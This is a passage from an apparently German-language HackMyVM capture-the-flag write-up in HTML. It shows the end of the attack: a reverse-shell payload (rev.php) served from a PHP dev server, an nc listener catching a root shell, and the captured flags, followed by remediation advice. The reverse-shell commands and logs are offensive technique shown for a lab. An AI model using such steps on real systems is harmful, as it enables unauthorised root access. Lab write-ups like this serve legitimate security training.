+                    <div class="prompt">┌──(root㉿cyber)-[/home/cyber/Downloads]<br>└─# <span class="command">php -S 0.0.0.0:4444</span></div>
+                     <pre>
+[Tue Oct 25 16:42:40 2022] PHP 8.1.7 Development Server (http://0.0.0.0:4444) started
+[Tue Oct 25 16:42:58 2022] <span class="command">192.168.2.153</span>:60630 Accepted <span class="comment"><!-- IP vermutlich falsch geloggt, sollte 192.168.2.111 sein --></span>
+[Tue Oct 25 16:42:58 2022] <span class="command">192.168.2.153</span>:60630 [200]: GET /rev.php
+[Tue Oct 25 16:42:58 2022] 192.168.2.153:60630 Closing
+[Tue Oct 25 16:42:58 2022] PHP Warning:  Undefined variable $daemon in /home/cyber/Downloads/rev.php on line 184
+[Tue Oct 25 16:42:58 2022] 192.168.2.153:60638 Accepted
+[Tue Oct 25 16:42:58 2022] 192.168.2.153:60638 [404]: GET /favicon.ico - No such file or directory
+[Tue Oct 25 16:42:58 2022] 192.168.2.153:60638 Closing
+[Tue Oct 25 16:44:00 2022] PHP Warning:  Undefined variable $daemon in /home/cyber/Downloads/rev.php on line 184
+[Tue Oct 25 16:44:00 2022] 192.168.2.153:60630 [200]: GET /rev.php
+[Tue Oct 25 16:44:00 2022] 192.168.2.153:60630 Closing
+[Tue Oct 25 16:52:47 2022] 192.168.2.153:60674 Accepted
+[Tue Oct 25 16:52:47 2022] 192.168.2.153:60674 [200]: GET /rev.php
+[Tue Oct 25 16:52:47 2022] 192.168.2.153:60674 Closing
+[Tue Oct 25 16:52:47 2022] PHP Warning:  Undefined variable $daemon in /home/cyber/Downloads/rev.php on line 184
+[Tue Oct 25 16:55:59 2022] PHP Warning:  Undefined variable $daemon in /home/cyber/Downloads/rev.php on line 184
+[Tue Oct 25 16:55:59 2022] 192.168.2.153:60674 [200]: GET /rev.php
+[Tue Oct 25 16:55:59 2022] 192.168.2.153:60674 Closing
+</pre>
+                  </div>
+            </div>
+            <!-- NC Listener mit Root Shell -->
+            <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]<br>└─# <span class="command">nc -lvnp 9001</span></div>
+                     <pre>
+listening on [any] 9001 ...
+<span class="password">connect to [192.168.2.153] from (UNKNOWN) [192.168.2.153] 43708</span> <span class="comment"><!-- IPs hier sehr wahrscheinlich falsch/verwirrend geloggt --></span>
+
+# <span class="command">id</span>
+<span class="password">root</span>
+</pre> <!-- Der Prompt wechselt direkt zu einer Root-Shell (#) -->
+                  </div>
+            </div>
+        </section>
+
+        <section id="flags">
+            <h2>Flags</h2>
+            <p class="analysis"><strong>Analyse:</strong> Da direkt Root-Zugriff erlangt wurde, können beide Flags sofort ausgelesen werden.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die User- und Root-Flags werden erfolgreich angezeigt.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Flags notieren, Bericht abschließen.<br><strong>Empfehlung (Admin):</strong> Die zugrundeliegenden Schwachstellen (unsicherer CuteEditor-Upload, Webserver/PHP als Root) dringend beheben.</p>
+            <div class="flag-container">
+                 <h2 class="flag-heading">Flags</h2>
+
+                <div class="code-block"><center>
+                    <div class="terminal">
+                        <span class="command">cat user.txt</span> <br> <!-- Pfad unklar, Annahme /home/user/user.txt oder ähnlich -->
+                        <span class="flag-content"><span class="password">HMVtuctictactoc</span></span>
+                    </div>
+                </center></div>
+
+                <div class="code-block"><center>
+                    <div class="terminal">
+                        <span class="command">cat root.txt</span> <br> <!-- Pfad unklar, Annahme /root/root.txt -->
+                        <span class="flag-content"><span class="password">HMVtictictictic</span></span>
+                    </div>
+                 </center></div>
+            </div>
+        </section>
+ 
+
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <p>Berichtsdatum: 25. Oktober 2022</p> <!-- Datum aus Nmap/Nikto-Scan entnommen -->
+    </footer>
+</body>
+</html>
